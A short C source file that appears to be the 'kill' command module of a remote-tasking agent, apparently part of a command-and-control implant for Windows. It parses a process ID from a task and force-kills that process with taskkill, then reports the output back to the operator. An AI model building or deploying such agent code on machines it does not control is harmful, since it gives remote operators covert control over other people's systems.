#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef INCLUDE_CMD_KILL

void command_kill(char *task_id, char *params) {
  int pid = 0;
  if (params[0] == '{') {
    char *key = strstr(params, "\"pid\"");
    if (key) {
      char *colon = strchr(key, ':');
      if (colon) {
        colon++;
        while (*colon == ' ') colon++;
        pid = atoi(colon);
      }
    }
  } else {
    pid = atoi(params);
  }

  if (pid == 0) {
    send_task_response(task_id, "Error: no PID specified");
    return;
  }

  char cmd[64];
  snprintf(cmd, sizeof(cmd), "taskkill /PID %d /F", pid);
  char *output = execute_shell(cmd);
  send_task_response(task_id, output);
  if (output)
    free(output);
}

#endif
